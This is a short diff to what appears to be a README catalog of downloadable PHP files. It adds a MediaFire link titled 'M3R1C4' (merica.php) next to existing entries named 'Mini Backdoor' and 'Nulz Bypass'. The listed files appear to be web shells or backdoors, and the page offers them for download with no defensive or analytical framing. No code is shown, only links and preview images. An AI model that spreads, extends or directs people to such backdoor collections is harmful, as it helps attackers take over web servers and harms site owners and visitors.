@@ -506,6 +506,9 @@ Date : 10 January 2023 [![Windows Badge](https://img.shields.io/badge/Windows-bl
 # <a href="https://www.mediafire.com/file/kup5vdzxd14xgsl/mini.php/file">Mini Backdoor</a>
 <img src="https://i.imgur.com/ar0hcaG.png" alt="beruangsalju profile">
 
+# <a href="https://www.mediafire.com/file/6cu6wweno8ui97p/merica.php/file">M3R1C4</a>
+<img src="https://i.imgur.com/yiZyTER.png" alt="beruangsalju profile">
+
 # <a href="https://www.mediafire.com/file/wk5n4kq4ld8y0e9/nulz.php/file">Nulz Bypass</a>
 <img src="https://i.imgur.com/UvZjElS.png" alt="beruangsalju profile">
 
